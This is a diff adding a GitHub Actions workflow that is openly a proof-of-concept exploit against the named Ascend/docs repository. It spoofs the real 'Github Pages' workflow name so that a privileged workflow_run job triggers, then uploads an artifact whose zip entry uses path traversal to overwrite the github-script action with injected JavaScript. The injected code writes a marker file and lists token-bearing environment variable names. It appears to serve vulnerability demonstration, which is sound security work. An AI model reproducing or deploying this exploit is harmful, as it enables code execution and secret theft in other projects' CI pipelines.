@@ -1,0 +1,27 @@
+name: Github Pages
+# Fork-PR controlled producer: same name as Ascend/docs' real "Github Pages" workflow,
+# so the privileged workflow_run consumer fires.
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: benign doc change
+        run: |
+          mkdir -p sources
+          echo "poc" > sources/poc.rst
+      - name: Upload crafted artifact (attacker-controlled zip entries)
+        uses: ./.github/actions/plant-multi
+        with:
+          name: docs-preview-${{ github.event.number }}
+          entries: |
+            [
+              {"name":"index.html","content":"<html>preview</html>"},
+              {"name":"x/../../../../_actions/actions/github-script/v7/dist/index.js","content":"const fs=require('fs');console.log('PWNED_ASCEND_RCE action='+String(process.env.GITHUB_ACTION));fs.writeFileSync('/tmp/ascend_pwn.txt','rce');console.log('TOKEN_KEYS='+Object.keys(process.env).filter(function(k){return /TOKEN/.test(k)}).join(','));"}
+            ]
